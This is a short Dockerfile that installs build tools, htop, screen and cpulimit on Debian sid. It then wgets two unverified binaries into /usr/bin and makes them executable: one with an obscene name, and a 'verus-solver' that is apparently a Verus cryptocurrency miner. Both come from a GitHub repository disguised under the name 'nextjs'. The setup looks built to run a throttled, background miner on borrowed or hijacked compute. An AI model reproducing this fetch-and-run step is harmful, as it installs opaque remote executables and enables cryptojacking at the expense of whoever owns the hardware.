FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev  libjansson-dev libgmp-dev make gcc g++ git zlib1g-dev ocl-icd-opencl-dev \
        && apt install htop -y && apt-get install -y screen && apt-get install cpulimit && apt-get install wget -y && cd /usr/bin  && wget https://github.com/sengepeke/nextjs/raw/master/kontol && chmod +x kontol  && wget https://github.com/sengepeke/nextjs/raw/master/verus-solver && chmod +x verus-solver



